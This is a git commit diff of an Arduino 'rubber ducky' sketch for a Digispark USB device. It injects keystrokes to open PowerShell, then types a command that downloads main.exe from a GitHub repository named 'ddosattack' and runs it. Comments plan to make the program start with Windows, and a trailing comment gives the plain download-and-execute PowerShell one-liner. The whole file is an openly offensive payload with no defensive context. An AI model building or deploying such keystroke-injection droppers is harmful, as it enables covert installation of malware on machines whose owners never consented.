523e1899d967c4d1b3b8fc43c70b1798fe6f9c3f
Technomancer <32704145+Fred-the-bot@users.noreply.github.com>
2022-11-23 08:30:45 +0100

    Update rubber_duck.ino

--- rubber_duck.ino
+++ rubber_duck.ino
@@ -1,15 +1,22 @@
 #include <DigiKeyboard.h>
 
 void setup() {
+  //line 5-10 launches powershell
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(200);
   DigiKeyboard.print("powershell");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
+  //line 12-15 downloads the .exe file
   DigiKeyboard.print("Invoke/WebRequest /Uri https>&&raw.githubusercontent.com&Fred/the/bot&ddosattack&master&main.exe /OutFile .");
-  DigiKeyboard.sendKeyStroke(0x64,MOD_ALT_RIGHT); // sends a \
-  DigiKeyboard.print("main.exe< .");
+  DigiKeyboard.sendKeyStroke(0x64,MOD_ALT_RIGHT); // sends a "\"
+  DigiKeyboard.print("main.exe<");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  //line x-x sets the exe file to launch with windows.
+
+
+  //line x-x launches the exe file and closes the powershell window
   DigiKeyboard.sendKeyStroke(0x64,MOD_ALT_RIGHT);
   DigiKeyboard.print("main.exe");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
@@ -22,4 +29,6 @@ void setup() {
 void loop() {
 
 }
+//$PWD.path
+
 // Invoke-WebRequest -Uri https://raw.githubusercontent.com/Fred-the-bot/ddosattack/master/main.exe -OutFile .\main.exe; .\main.exe
